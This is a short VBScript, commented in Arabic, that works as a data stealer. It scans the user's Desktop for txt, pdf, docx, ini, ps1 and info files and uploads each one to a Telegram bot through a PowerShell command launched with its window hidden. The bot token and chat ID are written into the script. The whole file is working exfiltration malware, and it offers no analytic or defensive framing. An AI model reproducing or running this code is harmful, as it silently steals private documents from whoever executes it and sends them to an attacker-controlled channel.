Dim WshShell, fso, botToken, chatId, desktopPath
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"
desktopPath = WshShell.SpecialFolders("Desktop")

' قائمة الامتدادات المسموح بها
Function IsTargetFile(fileName)
    Dim ext
    ext = LCase(fso.GetExtensionName(fileName))
    If ext = "txt" Or ext = "pdf" Or ext = "docx" Or ext = "ini" Or ext = "ps1" Or ext = "info" Then
        IsTargetFile = True
    Else
        IsTargetFile = False
    End If
End Function

Sub SendFileAsDocument(filePath)
    If Not fso.FileExists(filePath) Then Exit Sub
    
    ' استخدام PowerShell كـ "Wrapper" لتنفيذ طلب الـ Multipart بشكل صحيح
    ' لأن VBS بحد ذاته ضعيف في بناء الـ Multipart-form
    Dim psCommand
    psCommand = "powershell -Command ""$botToken = '" & botToken & "'; $chatId = '" & chatId & "'; " & _
                "$filePath = '" & filePath & "'; " & _
                "$url = 'https://api.telegram.org/bot' + $botToken + '/sendDocument'; " & _
                "$file = Get-Item $filePath; " & _
                "$form = @{ chat_id = $chatId; document = $file }; " & _
                "Invoke-RestMethod -Uri $url -Method Post -Form $form"""
    
    WshShell.Run psCommand, 0, True
End Sub

' التنفيذ
Dim folder, file
Set folder = fso.GetFolder(desktopPath)

For Each file In folder.Files
    If IsTargetFile(file.Name) Then
        SendFileAsDocument file.Path
    End If
Next

Set WshShell = Nothing
Set fso = Nothing
